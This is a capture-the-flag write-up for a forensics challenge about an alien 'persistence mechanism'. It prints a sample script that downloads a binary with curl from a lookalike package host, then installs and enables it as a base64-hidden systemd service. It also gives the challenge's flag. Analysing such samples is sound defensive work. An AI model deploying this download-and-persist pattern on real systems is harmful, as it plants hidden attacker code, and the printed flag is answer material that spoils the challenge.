# Extraterrestrial-Persistence

## FLAG: HTB{th3s3_4l13nS_4r3_s00000_b4s1c}

## Status: Complete

+ DOCKER: No
+ DOWNLOADABLE: Yes

Description: There is a rumor that aliens have developed a persistence mechanism that is impossible to detect. After investigating her recently compromised Linux server, Pandora found a possible sample of this mechanism. Can you analyze it and find out how they install their persistence?

## NOTES

1. Extract the files
   1. > unzip forensics_extraterrestrial_persistence.zip
      1. FILE: persistence.sh
2. Examine the file
   1. > file persistence.sh
      1. RESPONSE: `persistence.sh: ASCII text, with very long lines (396), with CRLF line terminators`
   2. > cat persistence.sh
      1. RESPONSE:

        ```bash
            n=`whoami`
            h=`hostname`
            path='/usr/local/bin/service'
            if [[ "$n" != "pandora" && "$h" != "linux_HQ" ]]; then exit; fi

            curl https://files.pypi-install.com/packeges/service -o $path

            chmod +x $path

            echo -e "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA=="|base64 --decode > /usr/lib/systemd/system/service.service

            systemctl enable service.service
        ```

   3. In here see what looks like a base64 encoded string
   4. Lets try and decode this
      1. > echo "W1VuaXRdCkRlc2NyaXB0aW9uPUhUQnt0aDNzM180bDEzblNfNHIzX3MwMDAwMF9iNHMxY30KQWZ0ZXI9bmV0d29yay50YXJnZXQgbmV0d29yay1vbmxpbmUudGFyZ2V0CgpbU2VydmljZV0KVHlwZT1vbmVzaG90ClJlbWFpbkFmdGVyRXhpdD15ZXMKCkV4ZWNTdGFydD0vdXNyL2xvY2FsL2Jpbi9zZXJ2aWNlCkV4ZWNTdG9wPS91c3IvbG9jYWwvYmluL3NlcnZpY2UKCltJbnN0YWxsXQpXYW50ZWRCeT1tdWx0aS11c2VyLnRhcmdldA==" | base64 -d
         1. RESPONSE:

            ```text
                [Unit]
                Description=HTB{th3s3_4l13nS_4r3_s00000_b4s1c}
                After=network.target network-online.target

                [Service]
                Type=oneshot
                RemainAfterExit=yes

                ExecStart=/usr/local/bin/service
                ExecStop=/usr/local/bin/service

                [Install]
                WantedBy=multi-user.target%
            ```

      2. In here we see the description which has our flag
           1. FLAG: `HTB{th3s3_4l13nS_4r3_s00000_b4s1c}`
